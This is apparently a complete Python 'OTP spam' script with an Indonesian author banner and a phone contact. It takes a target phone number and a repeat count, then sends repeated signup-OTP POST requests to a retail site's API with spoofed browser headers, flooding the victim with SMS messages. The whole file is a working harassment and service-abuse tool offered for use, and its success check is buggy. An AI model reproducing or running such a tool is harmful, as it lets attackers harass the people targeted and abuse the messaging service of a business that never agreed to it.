import json
import requests
import sys
import os


def main() :
        os.system('clear')
        banner = '''
        [*]AUTHOR :FANKY
        [*]WHATSAP:0895386194665
        [*]tangal :19 april 2022
        '''


        print (banner)
        no = input('target : ')
        jum = input('jumlah spam : ')

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'iphone' : no
        }


        for x in range(int(jum)):
                        leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'eror' in leosureo:
                print('gagal mengirim' + no )
        else:
                print('succes mengirim' + no )

main()
